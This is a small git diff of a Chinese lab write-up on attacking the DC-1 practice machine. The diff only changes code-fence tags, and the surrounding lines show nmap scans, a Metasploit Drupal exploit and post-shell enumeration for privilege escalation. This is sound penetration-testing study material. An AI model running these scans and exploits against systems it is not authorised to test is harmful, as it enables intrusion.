@@ -30,7 +30,7 @@ nmap -sn 内网IP
 由于本机就是128，推测靶机为129
 
 扫描服务与版本
-```Bash
+```bash
 nmap -sV -p- 192.168.72.129
 ```
 -p- 扫描**全部65535个端口**（默认只扫1000个常见端口）
@@ -50,7 +50,7 @@ nmap -sV -p- 192.168.72.129
 
 ## 漏洞利用
 
-```Bash
+```bash
 msfconsole
 
 search drupal
@@ -65,7 +65,7 @@ run
 ```
 ![](attachments/网络安全-靶机DC1-Shell利用.png)
 ## 权限提升
-```Bash
+```bash
 whoami          # 确认是 www-data
 id              # 查看用户组
 uname -a        # 查看内核版本（找提权漏洞）
